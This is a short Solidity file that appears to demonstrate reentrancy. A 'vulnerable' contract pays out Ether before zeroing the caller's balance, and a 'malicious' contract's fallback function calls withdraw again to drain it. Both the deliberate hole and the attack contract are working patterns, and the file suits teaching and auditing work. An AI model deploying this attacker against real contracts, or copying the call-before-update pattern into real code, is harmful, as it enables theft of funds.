pragma solidity 0.4.25;

contract vulnerable
{
    mapping(address => uint256) balances;
    
    function withdraw() external
    {
        uint256 amount = balances[msg.sender];
        require(msg.sender.call.value(amount)());
        balances[msg.sender] = 0;
    }
}

contract malicious
{
    vulnerable public vul = vulnerable(0x0);
    function () public payable
    {
        vul.withdraw();
    }
    
}
